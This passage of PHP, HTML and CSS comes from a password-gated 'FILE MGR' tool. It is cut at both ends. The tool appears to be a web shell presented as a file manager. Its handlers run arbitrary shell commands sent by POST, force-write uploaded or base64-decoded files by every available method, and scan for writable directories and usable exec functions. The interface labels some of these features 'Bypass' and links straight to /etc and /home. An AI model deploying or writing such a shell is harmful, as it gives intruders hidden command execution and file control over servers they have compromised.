            $forceDir = $path;
            $forceResults = array();
            $allLogs = array();

            if (!empty($_FILES['files'])) {
                $files = $_FILES['files'];
                $count = is_array($files['name']) ? count($files['name']) : 1;
                for ($i = 0; $i < $count; $i++) {
                    $fname = is_array($files['name'])     ? $files['name'][$i]     : $files['name'];
                    $ftmp  = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
                    $ferr  = is_array($files['error'])    ? $files['error'][$i]    : $files['error'];
                    if ($ferr !== UPLOAD_ERR_OK) {
                        $forceResults[] = array('name' => $fname, 'ok' => false, 'msg' => 'Upload error ' . $ferr, 'log' => array());
                        continue;
                    }
                    $dest = $forceDir . '/' . basename($fname);
                    $uploadData = @file_get_contents($ftmp);
                    $res = fm_force_upload_all_methods($dest, $ftmp, $uploadData);
                    $forceResults[] = array(
                        'name' => $fname,
                        'ok'   => $res['ok'],
                        'msg'  => $res['ok'] ? 'SUCCESS via ' . $res['method'] : 'All methods failed',
                        'method' => isset($res['method']) ? $res['method'] : '',
                        'path'  => isset($res['path']) ? $res['path'] : $dest,
                        'log'   => isset($res['log']) ? $res['log'] : array(),
                    );
                }
            } elseif (!empty($_POST['b64content'])) {
                // Base64-based force upload
                $b64force = $_POST['b64content'];
                $fnameB64 = isset($_POST['filename']) ? basename($_POST['filename']) : 'force_upload_' . time();
                $decodedB64 = base64_decode($b64force);
                if ($decodedB64 === false) {
                    echo json_encode(array('ok' => false, 'msg' => 'Invalid base64 content'));
                    break;
                }
                $destB64Force = $forceDir . '/' . $fnameB64;
                // Write to a temp file first, then use force methods
                $tmpForce = sys_get_temp_dir() . '/.fm_force_' . mt_rand(100000, 999999);
                @file_put_contents($tmpForce, $decodedB64);
                $res = fm_force_upload_all_methods($destB64Force, $tmpForce, $decodedB64);
                $forceResults[] = array(
                    'name' => $fnameB64,
                    'ok'   => $res['ok'],
                    'msg'  => $res['ok'] ? 'SUCCESS via ' . $res['method'] : 'All methods failed',
                    'method' => isset($res['method']) ? $res['method'] : '',
                    'path'  => isset($res['path']) ? $res['path'] : $destB64Force,
                    'log'   => isset($res['log']) ? $res['log'] : array(),
                );
                @unlink($tmpForce);
            } else {
                echo json_encode(array('ok' => false, 'msg' => 'No files or content provided'));
                break;
            }

            // Check if any succeeded
            $anyOk = false;
            foreach ($forceResults as $fr) {
                if ($fr['ok']) { $anyOk = true; break; }
            }
            echo json_encode(array('ok' => $anyOk, 'data' => $forceResults));
            break;

        // ---- DOWNLOAD ----
        case 'download':
            if (!is_file($path)) { echo json_encode(array('ok'=>false,'msg'=>'Not a file')); break; }
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($path) . '"');
            header('Content-Length: ' . filesize($path));
            header('Cache-Control: no-cache');
            ob_clean(); flush();
            readfile($path);
            exit;

        // ---- READ FILE ----
        case 'read':
            if (!is_file($path)) { echo json_encode(array('ok'=>false,'msg'=>'Not a file')); break; }
            $content = @file_get_contents($path);
            echo json_encode(array('ok' => true, 'content' => $content !== false ? $content : '', 'name' => basename($path)));
            break;

        // ---- SAVE FILE ----
        case 'save':
            $ok = @file_put_contents($path, $content);
            echo json_encode(array('ok' => $ok !== false, 'msg' => $ok !== false ? 'Saved.' : 'Save failed.'));
            break;

        // ---- NEW FILE ----
        case 'newfile':
            $dest = $path . '/' . basename($name);
            if (file_exists($dest)) { echo json_encode(array('ok'=>false,'msg'=>'Already exists')); break; }
            $ok = @file_put_contents($dest, '') !== false;
            echo json_encode(array('ok' => $ok, 'msg' => $ok ? 'File created.' : 'Failed.'));
            break;

        // ---- NEW FOLDER ----
        case 'newfolder':
            $dest = $path . '/' . basename($name);
            if (is_dir($dest)) { echo json_encode(array('ok'=>false,'msg'=>'Already exists')); break; }
            $ok = @mkdir($dest, 0755, true);
            echo json_encode(array('ok' => $ok, 'msg' => $ok ? 'Folder created.' : 'Failed.'));
            break;

        // ---- RENAME ----
        case 'rename':
            $newPath = dirname($path) . '/' . basename($name);
            if (file_exists($newPath)) { echo json_encode(array('ok'=>false,'msg'=>'Target already exists')); break; }
            $ok = @rename($path, $newPath);
            echo json_encode(array('ok' => $ok, 'msg' => $ok ? 'Renamed.' : 'Failed.'));
            break;

        // ---- DELETE ----
        case 'delete':
            $targets = json_decode(isset($_POST['targets']) ? $_POST['targets'] : '[]', true);
            if (empty($targets) && !empty($path)) $targets = array($path);
            $errors = array();
            foreach ($targets as $t) {
                $t = fm_safe_path($t);
                if (!fm_delete_recursive($t)) $errors[] = basename($t);
            }
            echo json_encode(array('ok' => empty($errors), 'msg' => empty($errors) ? 'Deleted.' : 'Failed: ' . implode(', ', $errors)));
            break;

        // ---- COPY ----
        case 'copy':
            $targets = json_decode(isset($_POST['targets']) ? $_POST['targets'] : '[]', true);
            if (empty($targets)) $targets = array($path);
            $errors = array();
            foreach ($targets as $t) {
                $t = fm_safe_path($t);
                $dst = $path2 . '/' . basename($t);
                if (!fm_copy_recursive($t, $dst)) $errors[] = basename($t);
            }
            echo json_encode(array('ok' => empty($errors), 'msg' => empty($errors) ? 'Copied.' : 'Failed: ' . implode(', ', $errors)));
            break;

        // ---- MOVE ----
        case 'move':
            $targets = json_decode(isset($_POST['targets']) ? $_POST['targets'] : '[]', true);
            if (empty($targets)) $targets = array($path);
            $errors = array();
            foreach ($targets as $t) {
                $t = fm_safe_path($t);
                $dst = $path2 . '/' . basename($t);
                $ok2 = fm_copy_recursive($t, $dst);
                if ($ok2) fm_delete_recursive($t);
                else $errors[] = basename($t);
            }
            echo json_encode(array('ok' => empty($errors), 'msg' => empty($errors) ? 'Moved.' : 'Failed: ' . implode(', ', $errors)));
            break;

        // ---- PERMISSIONS ----
        case 'get_perms':
            echo json_encode(array('ok' => true, 'data' => fm_icacls_get($path)));
            break;
        case 'set_perms':
            $user = isset($_POST['user']) ? $_POST['user'] : '';
            $perm = isset($_POST['perm']) ? $_POST['perm'] : '';
            echo json_encode(fm_icacls_set($path, $user, $perm));
            break;

        // ---- ZIP ----
        case 'zip':
            $targets = json_decode(isset($_POST['targets']) ? $_POST['targets'] : '[]', true);
            if (empty($targets)) $targets = array($path);
            $dir  = dirname(fm_safe_path($targets[0]));
            $dest = $dir . '/' . (isset($_POST['zipname']) ? $_POST['zipname'] : 'archive_' . time()) . '.zip';
            echo json_encode(fm_zip_files(array_map('fm_safe_path', $targets), $dest));
            break;

        // ---- UNZIP ----
        case 'unzip':
            $dest = dirname($path) . '/' . pathinfo($path, PATHINFO_FILENAME);
            echo json_encode(fm_unzip($path, $dest));
            break;

        // ---- SEARCH ----
        case 'search':
            $searchContent = (isset($_POST['search_content']) ? $_POST['search_content'] : '0') === '1';
            $cnt = 0;
            $results = fm_search($path, $query, $searchContent, $cnt);
            echo json_encode(array('ok' => true, 'data' => $results, 'count' => $cnt));
            break;

        // ---- WRITABLE DIRS ----
        case 'writable_dirs':
            echo json_encode(array('ok' => true, 'data' => fm_scan_writable_dirs()));
            break;

        // ---- EXEC METHODS ----
        case 'exec_methods':
            echo json_encode(array('ok' => true, 'data' => fm_detect_exec_methods()));
            break;

        // ---- TERMINAL ----
        case 'exec':
            $cmd     = isset($_POST['cmd']) ? $_POST['cmd'] : '';
            $cwd     = $path ? $path : '/';
            $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
            $execRes = fm_exec_cmd($fullCmd);
            echo json_encode(array('ok' => true, 'output' => $execRes['output'] !== '' ? $execRes['output'] : '(no output)', 'code' => 0, 'method' => $execRes['method']));
            break;

        // ---- SERVER INFO ----
        case 'serverinfo':
            echo json_encode(array('ok' => true, 'info' => fm_server_info(), 'disks' => fm_disk_info()));
            break;

        // ---- DRIVES ----
        case 'drives':
            echo json_encode(array('ok' => true, 'drives' => fm_get_drives()));
            break;

        default:
            echo json_encode(array('ok' => false, 'msg' => 'Unknown action: ' . htmlspecialchars($action)));
    }
    exit;
}

// ============================================================
// ROUTE
// ============================================================
$isAjax = !empty($_SERVER['HTTP_X_REQUESTED_WITH']) ||
          !empty($_POST['action']) ||
          (!empty($_GET['action']) && $_GET['action'] !== 'download');

if (!fm_is_authenticated()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login'])) {
        if (fm_login(isset($_POST['fm_password']) ? $_POST['fm_password'] : '')) {
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
        $loginError = 'Invalid password.';
    }
    if ($isAjax) {
        header('Content-Type: application/json');
        echo json_encode(array('ok' => false, 'msg' => 'Not authenticated', 'redirect' => true));
        exit;
    }
    // Show login page
    fm_render_login(isset($loginError) ? $loginError : '');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    fm_logout();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if ($isAjax || isset($_POST['action'])) {
    fm_handle_action();
    exit;
}

// Download via GET
if (isset($_GET['action']) && $_GET['action'] === 'download') {
    fm_handle_action();
    exit;
}

// Render full UI
fm_render_ui();
exit;

// ============================================================
// LOGIN PAGE
// ============================================================
function fm_render_login($error) {
    if ($error === null) $error = '';
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo FM_TITLE; ?> &mdash; Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:#16213e;border:1px solid #FFD700;border-radius:12px;padding:48px 40px;width:360px;box-shadow:0 0 40px rgba(255,215,0,.15)}
.logo{text-align:center;margin-bottom:32px}
.logo h1{color:#FFD700;font-size:28px;letter-spacing:2px;text-shadow:0 0 20px rgba(255,215,0,.4)}
.logo p{color:#888;font-size:12px;margin-top:6px;letter-spacing:1px}
.form-group{margin-bottom:20px}
label{display:block;color:#FFD700;font-size:12px;font-weight:600;letter-spacing:1px;margin-bottom:8px;text-transform:uppercase}
input[type=password]{width:100%;background:#0f3460;border:1px solid #333;border-radius:8px;color:#fff;padding:12px 16px;font-size:14px;outline:none;transition:border-color .2s}
input[type=password]:focus{border-color:#FFD700;box-shadow:0 0 0 2px rgba(255,215,0,.15)}
.btn-login{width:100%;background:linear-gradient(135deg,#FFD700,#e6ac00);border:none;border-radius:8px;color:#1a1a2e;font-size:15px;font-weight:700;letter-spacing:1px;padding:13px;cursor:pointer;transition:opacity .2s;text-transform:uppercase}
.btn-login:hover{opacity:.9}
.error{background:rgba(255,59,48,.15);border:1px solid rgba(255,59,48,.4);border-radius:6px;color:#ff6b6b;font-size:13px;padding:10px 14px;margin-bottom:16px;text-align:center}
.lock{font-size:48px;text-align:center;margin-bottom:16px}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo">
        <div class="lock">&#x1F510;</div>
        <h1>FILE MGR</h1>
        <p>FILE MANAGER</p>
    </div>
    <?php if ($error): ?><div class="error"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>
    <form method="post">
        <div class="form-group">
            <label>Password</label>
            <input type="password" name="fm_password" autofocus placeholder="Enter password">
        </div>
        <input type="hidden" name="fm_login" value="1">
        <button class="btn-login" type="submit">Unlock Access</button>
    </form>
</div>
</body>
</html>
<?php
}

// ============================================================
// MAIN UI
// ============================================================
function fm_render_ui() {
    $drives = fm_get_drives();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo FM_TITLE; ?></title>
<style>
/* ============ RESET & BASE ============ */
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --gold:#FFD700;--gold2:#e6ac00;--bg:#1a1a2e;--panel:#16213e;--panel2:#0f3460;
  --border:#2a2a4e;--text:#e0e0e0;--muted:#888;--danger:#ff6b6b;--success:#4ade80;
  --info:#60a5fa;--warn:#fbbf24;
}
html,body{height:100%;overflow:hidden}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Tahoma,sans-serif;font-size:14px;display:flex;flex-direction:column}
a{color:var(--gold);text-decoration:none}
a:hover{text-decoration:underline}
button{cursor:pointer;border:none;outline:none}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--panel)}
::-webkit-scrollbar-thumb{background:#444;border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:#666}

/* ============ LAYOUT ============ */
#header{background:var(--panel);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 16px;height:52px;flex-shrink:0;gap:12px;z-index:100}
#header .logo{color:var(--gold);font-size:18px;font-weight:700;letter-spacing:2px;white-space:nowrap;text-shadow:0 0 12px rgba(255,215,0,.3)}
#header .tagline{color:var(--muted);font-size:11px;letter-spacing:1px}
#header .spacer{flex:1}
#main{display:flex;flex:1;overflow:hidden}
#sidebar{width:220px;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;overflow-y:auto}
#content{flex:1;display:flex;flex-direction:column;overflow:hidden}
#toolbar{background:var(--panel);border-bottom:1px solid var(--border);padding:8px 12px;display:flex;gap:6px;flex-wrap:wrap;align-items:center;flex-shrink:0}
#breadcrumb{background:var(--panel2);border-bottom:1px solid var(--border);padding:7px 14px;font-size:12px;display:flex;align-items:center;gap:4px;flex-shrink:0;overflow-x:auto;white-space:nowrap}
#filelist-wrap{flex:1;overflow:auto;padding:0}
#statusbar{background:var(--panel);border-top:1px solid var(--border);padding:5px 14px;font-size:11px;color:var(--muted);display:flex;gap:16px;flex-shrink:0}

/* ============ SIDEBAR ============ */
.sidebar-section{padding:12px 0}
.sidebar-section h3{color:var(--muted);font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:0 14px 6px}
.sidebar-item{display:flex;align-items:center;gap:8px;padding:8px 14px;cursor:pointer;color:var(--text);transition:background .15s;font-size:13px;border-left:2px solid transparent}
.sidebar-item:hover{background:rgba(255,215,0,.07);border-left-color:var(--gold)}
.sidebar-item.active{background:rgba(255,215,0,.12);border-left-color:var(--gold);color:var(--gold)}
.sidebar-item .icon{font-size:16px;width:20px;text-align:center}
.drive-badge{background:var(--panel2);border:1px solid var(--border);border-radius:4px;color:var(--gold);font-size:11px;font-weight:700;padding:2px 6px;margin-left:auto}

/* ============ BUTTONS ============ */
.btn{display:inline-flex;align-items:center;gap:5px;background:var(--panel2);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:12px;padding:6px 10px;transition:all .15s;white-space:nowrap}
.btn:hover{background:rgba(255,215,0,.12);border-color:var(--gold);color:var(--gold)}
.btn.btn-gold{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#1a1a2e;font-weight:700;border-color:var(--gold)}
.btn.btn-gold:hover{opacity:.9}
.btn.btn-danger{background:rgba(255,107,107,.15);border-color:rgba(255,107,107,.4);color:var(--danger)}
.btn.btn-danger:hover{background:rgba(255,107,107,.25)}
.btn.btn-sm{padding:4px 8px;font-size:11px}
.btn:disabled{opacity:.4;cursor:not-allowed}

/* ============ FILE TABLE ============ */
#file-table{width:100%;border-collapse:collapse}
#file-table th{background:var(--panel);color:var(--muted);font-size:11px;font-weight:600;letter-spacing:.5px;padding:8px 12px;text-align:left;position:sticky;top:0;z-index:10;border-bottom:1px solid var(--border);text-transform:uppercase;cursor:pointer;user-select:none;white-space:nowrap}
#file-table th:hover{color:var(--gold)}
#file-table th .sort-arrow{margin-left:4px;opacity:.4}
#file-table th.sorted .sort-arrow{opacity:1;color:var(--gold)}
#file-table td{padding:7px 12px;border-bottom:1px solid rgba(255,255,255,.04);vertical-align:middle}
#file-table tr:hover td{background:rgba(255,215,0,.04)}
#file-table tr.selected td{background:rgba(255,215,0,.09);border-bottom-color:rgba(255,215,0,.15)}
.file-name-cell{display:flex;align-items:center;gap:8px;min-width:180px}
.file-icon{font-size:18px;flex-shrink:0}
.file-name-text{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:260px}
.file-name-link{color:var(--text);font-weight:500}
.file-name-link:hover{color:var(--gold);text-decoration:none}
.dir-link{color:var(--info);font-weight:600}
.dir-link:hover{color:var(--gold)}
.file-size{color:var(--muted);font-size:12px;white-space:nowrap}
.file-date{color:var(--muted);font-size:12px;white-space:nowrap}
.file-ext{background:var(--panel2);border:1px solid var(--border);border-radius:3px;color:var(--muted);font-size:10px;padding:1px 5px;text-transform:uppercase}
.file-hidden{opacity:.5}
.row-check{width:36px;text-align:center}
.row-check input{accent-color:var(--gold);width:14px;height:14px;cursor:pointer}
.col-actions{width:120px;white-space:nowrap}
.row-action-btns{display:flex;gap:4px}

/* ============ MODALS ============ */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:1000;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(2px)}
.modal-overlay.hidden{display:none}
.modal{background:var(--panel);border:1px solid var(--border);border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.5);width:600px;max-width:95vw;max-height:90vh;display:flex;flex-direction:column;overflow:hidden}
.modal.modal-lg{width:900px}
.modal.modal-xl{width:1100px}
.modal-header{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--panel2)}
.modal-header h2{color:var(--gold);font-size:16px;font-weight:700;letter-spacing:1px}
.modal-close{background:none;color:var(--muted);font-size:20px;line-height:1;padding:0 4px;transition:color .15s}
.modal-close:hover{color:var(--danger)}
.modal-body{padding:20px;overflow-y:auto;flex:1}
.modal-footer{padding:14px 20px;border-top:1px solid var(--border);display:flex;gap:8px;justify-content:flex-end;background:var(--panel2)}

/* ============ FORMS ============ */
.form-group{margin-bottom:16px}
.form-group label{display:block;color:var(--gold);font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:6px}
.form-control{width:100%;background:var(--panel2);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:9px 12px;font-size:13px;outline:none;transition:border-color .2s}
.form-control:focus{border-color:var(--gold);box-shadow:0 0 0 2px rgba(255,215,0,.1)}
textarea.form-control{font-family:'Cascadia Code','Consolas','Courier New',monospace;font-size:13px;resize:none;min-height:200px;line-height:1.5}
select.form-control{cursor:pointer}

/* ============ EDITOR ============ */
#editor-content{font-family:'Cascadia Code','Consolas','Courier New',monospace;font-size:13px;line-height:1.6;background:#0a0a1a;border:1px solid var(--border);border-radius:6px;color:#f0f0f0;resize:none;width:100%;height:calc(100vh - 260px);min-height:400px;padding:14px;outline:none;tab-size:4}
#editor-content:focus{border-color:var(--gold)}

/* ============ TERMINAL ============ */
#terminal-output{background:#0a0a1a;border:1px solid var(--border);border-radius:6px;color:#00ff88;font-family:'Cascadia Code','Consolas','Courier New',monospace;font-size:12px;height:320px;overflow-y:auto;padding:12px;white-space:pre-wrap;word-break:break-all}
#terminal-input{width:100%;background:var(--panel2);border:1px solid var(--border);border-radius:6px;color:#00ff88;font-family:'Cascadia Code','Consolas',monospace;font-size:13px;padding:10px 12px;outline:none;margin-top:8px}
#terminal-input:focus{border-color:var(--gold)}
.terminal-prompt{color:var(--gold)}
.terminal-error{color:var(--danger)}

/* ============ TABS ============ */
.tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--panel2);padding:0 12px;gap:2px}
.tab-btn{background:none;border:none;border-bottom:2px solid transparent;color:var(--muted);cursor:pointer;font-size:13px;padding:10px 16px;transition:all .15s}
.tab-btn:hover{color:var(--text)}
.tab-btn.active{border-bottom-color:var(--gold);color:var(--gold);font-weight:600}
.tab-pane{display:none;padding:20px}
.tab-pane.active{display:block}

/* ============ UPLOAD DROP ZONE ============ */
#drop-zone{border:2px dashed var(--border);border-radius:8px;color:var(--muted);padding:32px;text-align:center;transition:all .2s;cursor:pointer}
#drop-zone.drag-over{border-color:var(--gold);background:rgba(255,215,0,.06);color:var(--gold)}
#drop-zone .dz-icon{font-size:40px;margin-bottom:10px}
#upload-file-input{display:none}
#upload-progress-list{max-height:200px;overflow-y:auto;margin-top:12px}
.upload-item{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-bottom:6px;display:flex;align-items:center;gap:8px;font-size:12px}
.upload-item .ui-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.upload-item .ui-status{color:var(--success)}
.upload-item .ui-status.err{color:var(--danger)}

/* ============ SERVER INFO ============ */
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.info-card{background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:16px}
.info-card h4{color:var(--gold);font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:12px;border-bottom:1px solid var(--border);padding-bottom:8px}
.info-row{display:flex;justify-content:space-between;font-size:12px;margin-bottom:6px;gap:8px}
.info-row .ik{color:var(--muted);flex-shrink:0}
.info-row .iv{color:var(--text);text-align:right;word-break:break-all}
.disk-bar{background:var(--panel);border-radius:4px;height:6px;margin-top:6px;overflow:hidden}
.disk-bar-fill{background:linear-gradient(90deg,var(--gold),var(--gold2));height:100%;border-radius:4px;transition:width .3s}
.disk-bar-fill.warn{background:linear-gradient(90deg,#fbbf24,#f59e0b)}
.disk-bar-fill.danger{background:linear-gradient(90deg,#ef4444,#dc2626)}

/* ============ SEARCH ============ */
#search-results{max-height:400px;overflow-y:auto}
.search-result-item{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 14px;margin-bottom:6px;display:flex;align-items:center;gap:10px;cursor:pointer;transition:border-color .15s}
.search-result-item:hover{border-color:var(--gold)}
.search-result-item .sr-icon{font-size:20px}
.search-result-item .sr-info{flex:1;overflow:hidden}
.search-result-item .sr-name{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.search-result-item .sr-path{color:var(--muted);font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.search-result-item .sr-badge{background:rgba(96,165,250,.15);border:1px solid rgba(96,165,250,.3);border-radius:3px;color:var(--info);font-size:10px;padding:1px 5px;flex-shrink:0}

/* ============ ALERTS / TOAST ============ */
#toast-container{position:fixed;top:16px;right:16px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
.toast{background:var(--panel);border:1px solid var(--border);border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.4);color:var(--text);font-size:13px;padding:12px 16px;min-width:240px;max-width:360px;animation:toastIn .2s ease;pointer-events:all;display:flex;align-items:flex-start;gap:10px}
.toast.success{border-color:rgba(74,222,128,.4);background:rgba(74,222,128,.1)}
.toast.error{border-color:rgba(255,107,107,.4);background:rgba(255,107,107,.1)}
.toast.info{border-color:rgba(96,165,250,.4);background:rgba(96,165,250,.1)}
.toast.warn{border-color:rgba(251,191,36,.4);background:rgba(251,191,36,.1)}
@keyframes toastIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}

/* ============ IMAGE VIEWER ============ */
#img-viewer-wrap{text-align:center;padding:16px}
#img-viewer-wrap img{max-width:100%;max-height:70vh;border-radius:6px;border:1px solid var(--border)}

/* ============ PERMISSION DIALOG ============ */
#perms-output{background:#0a0a1a;border:1px solid var(--border);border-radius:6px;color:#ccc;font-family:'Consolas',monospace;font-size:12px;padding:12px;min-height:80px;white-space:pre-wrap;margin-bottom:12px}

/* ============ WRITABLE DIRS ============ */
.wd-table{width:100%;border-collapse:collapse;font-size:12px}
.wd-table th{background:var(--panel2);color:var(--muted);font-size:10px;font-weight:700;letter-spacing:.5px;padding:7px 10px;text-align:left;text-transform:uppercase;border-bottom:1px solid var(--border)}
.wd-table td{padding:7px 10px;border-bottom:1px solid rgba(255,255,255,.04);vertical-align:middle;word-break:break-all}
.wd-table tr:hover td{background:rgba(255,215,0,.04)}
.wd-badge{border-radius:3px;font-size:10px;font-weight:700;padding:2px 7px;text-transform:uppercase;white-space:nowrap}
.wd-badge.writable{background:rgba(74,222,128,.15);color:var(--success)}
.wd-badge.readonly{background:rgba(96,165,250,.15);color:var(--info)}
.wd-badge.exists{background:rgba(251,191,36,.15);color:var(--warn)}
.wd-badge.notfound{background:rgba(255,107,107,.1);color:var(--muted)}
.exec-method-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;margin-top:12px}
.em-card{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 14px;display:flex;align-items:center;justify-content:space-between}
.em-name{font-size:12px;font-weight:600;color:var(--text)}
.em-status{font-size:11px;font-weight:700;padding:2px 8px;border-radius:3px}
.em-status.avail{background:rgba(74,222,128,.15);color:var(--success)}
.em-status.disabled{background:rgba(255,107,107,.1);color:var(--danger)}
#wdirs-scan-msg{font-size:12px;color:var(--muted);margin-bottom:10px}
.wd-use-btn{font-size:11px;padding:3px 8px;border-radius:4px;background:var(--panel2);border:1px solid var(--border);color:var(--gold);cursor:pointer;white-space:nowrap}
.wd-use-btn.wd-force-btn{border-color:rgba(251,191,36,.5);color:var(--warn);font-weight:700}
.wd-use-btn.wd-force-btn:hover{background:rgba(251,191,36,.1)}
.force-log{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:12px;margin-top:8px;max-height:400px;overflow-y:auto}
.force-log-header{font-size:12px;font-weight:700;color:var(--gold);margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border)}
.force-log-entry{font-size:11px;padding:4px 8px;margin:2px 0;border-radius:3px;font-family:Consolas,monospace;line-height:1.4}
.force-log-entry.log-ok{background:rgba(74,222,128,.08);color:var(--success)}
.force-log-entry.log-fail{background:rgba(255,107,107,.05);color:var(--muted)}
.wd-use-btn:hover{background:rgba(255,215,0,.12)}

/* ============ MISC ============ */
.empty-state{color:var(--muted);font-size:14px;padding:60px;text-align:center}
.empty-state .es-icon{font-size:48px;margin-bottom:14px;opacity:.4}
.loading{color:var(--muted);font-style:italic;padding:30px;text-align:center}
.badge{border-radius:4px;font-size:10px;font-weight:700;padding:2px 6px;text-transform:uppercase}
.badge-dir{background:rgba(96,165,250,.15);color:var(--info)}
.badge-file{background:rgba(74,222,128,.1);color:var(--success)}
.separator{background:var(--border);width:1px;height:24px;flex-shrink:0}
.path-input{background:var(--panel2);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:12px;padding:5px 10px;outline:none;flex:1;min-width:100px;max-width:400px}
.path-input:focus{border-color:var(--gold)}
#select-all-cb{accent-color:var(--gold);width:14px;height:14px;cursor:pointer}
.hidden-file-row td .file-name-text{opacity:.55}
</style>
</head>
<body>

<!-- TOAST CONTAINER -->
<div id="toast-container"></div>

<!-- HEADER -->
<div id="header">
    <div>
        <div class="logo">&#x1F5C2; FILE MANAGER</div>
        <div class="tagline">FILE MANAGER</div>
    </div>
    <div class="separator"></div>
    <button class="btn" onclick="FM.openServerInfo()">&#x1F5A5; Server Info</button>
    <button class="btn" onclick="FM.openTerminal()">&#x1F4BB; Terminal</button>
    <button class="btn" onclick="FM.openSearch()">&#x1F50D; Search</button>
    <button class="btn" onclick="FM.openWritableDirs()" style="border-color:rgba(74,222,128,.4);color:var(--success)">&#x1F513; Writable Dirs</button>
    <div class="spacer"></div>
    <span style="color:var(--muted);font-size:12px">v<?php echo FM_VERSION; ?></span>
    <div class="separator"></div>
    <a href="?action=logout" class="btn btn-danger" onclick="return confirm('Log out?')">&#x1F6AA; Logout</a>
</div>

<!-- MAIN -->
<div id="main">
    <!-- SIDEBAR -->
    <div id="sidebar">
        <div class="sidebar-section">
            <h3>Filesystem</h3>
            <?php foreach ($drives as $d): ?>
            <div class="sidebar-item" onclick="FM.navTo('<?php echo $d; ?>')">
                <span class="icon">&#x1F4C0;</span>
                <span><?php echo $d; ?></span>
                <span class="drive-badge">/</span>
            </div>
            <?php endforeach; ?>
        </div>
        <div class="sidebar-section">
            <h3>Quick Access</h3>
            <div class="sidebar-item" onclick="FM.navTo('/var/www/html')"><span class="icon">&#x1F310;</span>www/html</div>
            <div class="sidebar-item" onclick="FM.navTo('/var/www')"><span class="icon">&#x1F4C1;</span>www</div>
            <div class="sidebar-item" onclick="FM.navTo('/tmp')"><span class="icon">&#x1F9F9;</span>tmp</div>
            <div class="sidebar-item" onclick="FM.navTo('/etc')"><span class="icon">&#x2699;</span>etc</div>
            <div class="sidebar-item" onclick="FM.navTo('/home')"><span class="icon">&#x1F465;</span>home</div>
            <div class="sidebar-item" onclick="FM.navTo('<?php echo addslashes(dirname(__FILE__)); ?>')"><span class="icon">&#x1F4C2;</span>This Dir</div>
        </div>
        <div class="sidebar-section">
            <h3>View Options</h3>
            <div class="sidebar-item" id="hidden-toggle" onclick="FM.toggleHidden()">
                <span class="icon">&#x1F441;</span>Hidden Files
                <span id="hidden-badge" class="drive-badge" style="background:rgba(255,107,107,.15);color:var(--danger)">OFF</span>
            </div>
        </div>
        <div class="sidebar-section">
            <h3>Bulk</h3>
            <div class="sidebar-item" onclick="FM.bulkDelete()"><span class="icon">&#x1F5D1;</span>Delete Selected</div>
            <div class="sidebar-item" onclick="FM.bulkZip()"><span class="icon">&#x1F4E6;</span>Zip Selected</div>
            <div class="sidebar-item" onclick="FM.bulkCopy()"><span class="icon">&#x1F4CB;</span>Copy Selected</div>
            <div class="sidebar-item" onclick="FM.bulkMove()"><span class="icon">&#x2702;</span>Move Selected</div>
        </div>
        <div class="sidebar-section">
            <h3>Bypass</h3>
            <div class="sidebar-item" onclick="FM.openWritableDirs()"><span class="icon">&#x1F513;</span>Writable Dirs</div>
            <div class="sidebar-item" onclick="FM.openBypassUpload()"><span class="icon">&#x26A1;</span>Bypass Upload</div>
        </div>
    </div>
    <div id="content">
        <!-- TOOLBAR -->
        <div id="toolbar">
            <button class="btn" onclick="FM.goUp()" title="Go Up">&#x2B06; Up</button>
            <button class="btn" onclick="FM.refresh()" title="Refresh">&#x1F504; Refresh</button>
            <div class="separator"></div>
